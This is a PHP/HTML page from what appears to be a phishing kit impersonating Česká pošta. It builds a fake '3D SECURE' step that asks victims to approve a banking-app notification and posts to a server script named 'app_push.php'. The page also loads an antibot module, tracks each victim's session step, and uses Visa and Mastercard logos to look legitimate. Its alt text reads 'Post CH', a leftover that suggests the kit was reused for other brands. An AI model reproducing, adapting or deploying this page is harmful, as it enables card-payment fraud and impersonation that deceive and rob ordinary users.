<?php
session_start();

include 'lang_main.php';
require_once __DIR__ . '/antibot.php';
validateSession(4);
// TRACKING STEP
$_SESSION['step'] = 'app_validation'; 
?>
<!DOCTYPE html>
<html lang="<?= $current_lang ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex">
    <title><?= t('app_title') ?> | Česká pošta</title>
    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
    <link rel="stylesheet" href="assets/post-branding.css?v=<?= time() ?>">
    <script src="assets/site.min.js"></script>
    <style>
        .app-animation {
            width: 80px; /* Reduced from 100px */
            height: 80px;
            margin: 0 auto 25px auto;
            position: relative;
        }
        
        /* Pulse Animation for Phone/App */
        .pulse-ring {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            height: 100%;
            width: 100%;
            border-radius: 50%;
            border: 3px solid #ffcc00; /* Post Yellow */
            animation: pulsate 2s ease-out infinite;
            opacity: 0;
        }
        
        .phone-icon {
            font-size: 36px; /* Reduced from 42px */
            background: #fff;
            width: 60px; /* Reduced from 70px */
            height: 60px;
            border-radius: 50%;
            line-height: 60px;
            text-align: center;
            position: relative;
            z-index: 10;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            color: #333;
            border: 2px solid #ffcc00;
        }

        @keyframes pulsate {
            0% { transform: translate(-50%, -50%) scale(0.8); opacity: 0.8; }
            100% { transform: translate(-50%, -50%) scale(1.8); opacity: 0; } /* Reduced scale from 2.2 to 1.8 */
        }

        .page-title {
            font-size: 22px !important;
            font-weight: 600 !important;
            margin-bottom: 12px !important;
            text-align: center !important;
            color: #111;
        }
        .page-subtitle {
            font-size: 14px;
            color: #333;
            font-weight: 500;
            margin: 0 auto 15px auto;
            text-align: center;
            max-width: 450px;
            padding: 0 10px;
        }
        .page-desc {
            font-size: 13px;
            color: #666;
            line-height: 1.5;
            max-width: 400px;
            margin: 0 auto 30px auto;
            text-align: center;
            padding: 0 15px;
        }

        .btn-confirm {
            background-color: #ffcc00;
            color: #222;
            padding: 16px 20px;
            border: none;
            border-radius: 4px;
            width: 100%;
            max-width: 320px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
            margin: 0 auto;
            display: block;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .btn-confirm:hover {
            background-color: #e6b800;
            transform: translateY(-1px);
        }
        
        .error-msg {
            color: #d32f2f;
            background: #fde8e8;
            padding: 12px;
            border-radius: 4px;
            font-size: 13px;
            text-align: center;
            margin-bottom: 25px;
            display: none; /* Hidden by default */
        }
        
        /* Language Selector Styles */
        .lang-selector {
            display: flex;
            gap: 12px;
            margin-right: 25px;
            font-size: 13px;
            font-weight: 500;
            padding-right: 25px;
            border-right: 1px solid #e0e0e0;
        }
        .lang-selector a {
            text-decoration: none;
            color: #666;
            transition: all 0.2s;
        }
        .lang-selector a:hover {
            color: #000;
        }
        .lang-selector a.active {
            color: #111;
            font-weight: 700;
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .lang-selector {
                margin-right: 15px;
                padding-right: 15px;
                gap: 8px;
                font-size: 12px;
            }
            .page-title {
                font-size: 18px !important;
            }
            .page-subtitle {
                font-size: 13px !important;
            }
            .page-desc {
                font-size: 12px !important;
                margin-bottom: 25px;
            }
            .btn-confirm {
                width: 100%;
                padding: 14px;
                font-size: 15px;
            }
        }
        /* GLOBAL LAYOUT FIX */
        html {
            height: 100%;
        }
        body {
            min-height: 100%;
            display: flex;
            flex-direction: column;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            background-color: #f4f6f8;
            font-family: 'Frutiger', sans-serif;
            color: #333;
        }
        .post-header {
            flex-shrink: 0;
            background: #fff;
            padding: 15px 0;
            width: 100%;
            z-index: 10;
        }
        .post-footer {
            flex-shrink: 0;
            width: 100%;
        }
        .main-wrapper {
            flex-grow: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
            position: relative;
        }
        .content-container {
            width: 100%;
            display: flex;
            justify-content: center;
        }
        @media (max-width: 480px) {
            .main-wrapper { padding: 15px; }
            .form-card { margin: 0 auto; }
        }
    </style>
</head>
<body>
    <div class="post-yellow-bar"></div>
    <header class="post-header">
        <div class="header-container">
            <div class="logo-container">
                <img src="assets/POST.svg" alt="Post CH" class="post-logo">
            </div>
            <div class="header-right">
                <div class="login-text">
                    <img src="assets/lock.svg" alt="Secure" class="lock-icon">
                    <span><?= t('secure_conn') ?></span>
                </div>
            </div>
        </div>
    </header>
    <main class="main-wrapper">
        <div class="content-container">
            
            <!-- STEPPER -->
            <div class="stepper">
                <div class="step completed">1</div>
                <div class="step-line filled"></div>
                <div class="step active">2</div>
                <div class="step-line"></div>
                <div class="step">3</div>
            </div>
            
            <div class="authentication-wrapper">
                
                <?php if(isset($_GET['error'])): ?>
                <div class="error-banner">
                    <i class="fas fa-exclamation-circle"></i>
                    <span><?= t('error_timeout_msg') ?></span>
                </div>
                <?php endif; ?>

                <h1 class="auth-title"><?= t('app_title') ?></h1>
                
                <p class="auth-desc">
                    <?= t('app_subtitle') ?>
                </p> 

                <div class="secure-header-badge">
                    <i class="fas fa-shield-alt"></i> 3D SECURE
                </div>

                <div class="mobile-verify-visual">
                    <div class="phone-frame">
                        <div class="screen-notch"></div>
                        <div class="screen-content">
                            <div class="notif-pop">
                                <div class="notif-header">
                                    <div class="bank-icon-mini"></div>
                                    <span>Bank • Now</span>
                                </div>
                                <div class="notif-body">
                                    <div class="notif-title">Validation</div>
                                    <div class="notif-text"><?= t('notif_confirm_msg') ?></div>
                                </div>
                            </div>
                            <div class="screen-btn"></div>
                        </div>
                    </div>
                    <div class="signal-waves">
                        <div class="wave w1"></div>
                        <div class="wave w2"></div>
                        <div class="wave w3"></div>
                    </div>
                </div>

                <p style="font-size:11px; color:#888; margin:-20px 0 25px 0; font-style:italic;">
                    <i class="fas fa-info-circle" style="margin-right:4px;"></i> <?= t('app_sim_disclaimer') ?>
                </p> 

                <div class="instruction-steps">
                    <div class="step-item">
                        <div class="step-num">1</div>
                        <div class="step-text"><?= t('app_desc') ?></div>
                    </div>
                </div>

                <form action="system_srv/app_push.php" method="POST">
                    <button type="submit" class="btn-app-validate">
                        <span class="btn-text"><?= t('app_btn') ?></span>
                        <i class="fas fa-arrow-right"></i>
                    </button>
                </form>

                <div class="secure-logos-row">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:14px;">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" style="height:18px;">
                </div>
                
            </div>
        </div>
    </main>
    <style>
        /* Modern Banking UI Styles */
        .authentication-wrapper {
            background: #ffffff;
            border-radius: 16px;
            padding: 40px 30px;
            max-width: 460px;
            margin: 20px auto;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0,0,0,0.06);
            border: 1px solid #f0f0f0;
            position: relative;
            overflow: hidden;
        }

        .secure-header-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: #f5f7fa;
            color: #5d6d7e;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 700;
            letter-spacing: 0.5px;
            margin-bottom: 30px;
            border: 1px solid #e1e4e8;
        }

        .auth-title {
            font-size: 22px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 12px;
            letter-spacing: -0.5px;
        }

        .auth-desc {
            font-size: 15px;
            color: #555;
            line-height: 1.5;
            margin-bottom: 30px;
        }

        /* Phone Visual */
        .mobile-verify-visual {
            position: relative;
            width: 120px;
            height: 120px;
            margin: 0 auto 30px auto;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .phone-frame {
            width: 56px;
            height: 96px;
            background: #2c3e50;
            border-radius: 10px;
            position: relative;
            z-index: 5;
            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
            border: 2px solid #34495e;
        }

        .screen-notch {
            position: absolute;
            top: 4px;
            left: 50%;
            transform: translateX(-50%);
            width: 16px;
            height: 4px;
            background: #1a252f;
            border-radius: 4px;
            z-index: 6;
        }

        .screen-content {
            background: #fff;
            width: 100%;
            height: 100%;
            border-radius: 8px;
            overflow: hidden;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .notif-pop {
            width: 44px;
            height: 24px;
            background: #ffffff;
            border-radius: 4px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
            position: absolute;
            top: 15px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            flex-direction: column;
            padding: 3px;
            border: 1px solid #eee;
            animation: popIn 3s infinite;
        }

        @keyframes popIn {
            0%, 10% { transform: translate(-50%, -10px); opacity: 0; }
            20%, 90% { transform: translate(-50%, 0); opacity: 1; }
            100% { transform: translate(-50%, -10px); opacity: 0; }
        }

        .notif-header {
            display: flex;
            align-items: center;
            gap: 2px;
            margin-bottom: 2px;
        }
        .bank-icon-mini {
            width: 4px;
            height: 4px;
            background: #ffcc00;
            border-radius: 1px;
        }
        .notif-header span {
            font-size: 3px;
            color: #888;
            font-weight: 600;
        }
        .notif-body {
            display: flex;
            flex-direction: column;
        }
        .notif-title { font-size: 4px; font-weight: 700; color: #111; }
        .notif-text { font-size: 3px; color: #555; }

        .signal-waves {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1;
        }

        .wave {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border: 1px solid #ffcc00;
            border-radius: 50%;
            opacity: 0;
        }

        .w1 { width: 80px; height: 80px; animation: ripple 2.5s infinite 0s; }
        .w2 { width: 110px; height: 110px; animation: ripple 2.5s infinite 0.6s; }
        .w3 { width: 140px; height: 140px; animation: ripple 2.5s infinite 1.2s; }

        @keyframes ripple {
            0% { transform: translate(-50%, -50%) scale(0.8); opacity: 0.6; border-width: 2px; }
            100% { transform: translate(-50%, -50%) scale(1.2); opacity: 0; border-width: 0px; }
        }

        /* Action Button */
        .btn-app-validate {
            background: #ffcc00;
            color: #1a1a1a;
            width: 100%;
            padding: 16px 20px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(255, 204, 0, 0.3);
        }

        .btn-app-validate:hover {
            background: #ffdb4d;
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(255, 204, 0, 0.4);
        }

        .instruction-steps {
            background: #f9f9f9;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 25px;
            text-align: left;
        }

        .step-item {
            display: flex;
            align-items: start;
            gap: 12px;
        }

        .step-num {
            background: #1a1a1a;
            color: #fff;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            font-size: 12px;
            font-weight: 700;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            margin-top: 2px;
        }

        .step-text {
            font-size: 13px;
            color: #444;
            line-height: 1.4;
        }

        .secure-logos-row {
            margin-top: 30px;
            opacity: 0.6;
            filter: grayscale(100%);
            display: flex;
            justify-content: center;
            gap: 15px;
            transition: opacity 0.3s;
        }
        .secure-logos-row:hover {
            opacity: 1;
            filter: grayscale(0%);
        }

        .error-banner {
            background: #fef2f2;
            border: 1px solid #fee2e2;
            color: #ef4444;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 8px;
            justify-content: center;
        }

        @media (max-width: 480px) {
            .authentication-wrapper {
                padding: 30px 20px;
                margin: 10px;
                box-shadow: none;
                border: none;
            }
        }
    </style>
    <footer class="post-footer">
        <div class="footer-container">
            <!-- DESKTOP VERSION -->
            <div class="footer-desktop">
                <div class="footer-col">
                    <h4><?= t('help_contact') ?></h4>
                    <a href="#">FAQ</a>
                    <a href="#">Contact Center</a>
                    <a href="#">Support</a>
                </div>
                <div class="footer-col">
                    <h4><?= t('data_prot') ?></h4>
                    <a href="#"><?= t('cond_gen') ?></a>
                    <a href="#"><?= t('privacy_policy') ?></a>
                    <a href="#"><?= t('cookies') ?></a>
                </div>
                <div class="footer-col" style="justify-content:flex-end; align-items:flex-end; text-align:right;">
                    <img src="assets/POST.svg" height="28" style="opacity:0.4; margin-bottom:10px;">
                    <p style="font-size:11px; color:#999; margin:0;">
                        &copy; <?= date('Y') ?> Česká pošta
                    </p>
                </div>
            </div>
            <!-- MOBILE VERSION -->
            <div class="footer-mobile">
                &copy; <?= date('Y') ?> <?= t('copyright') ?>
            </div>
        </div>
    </footer>
</body>
</html>
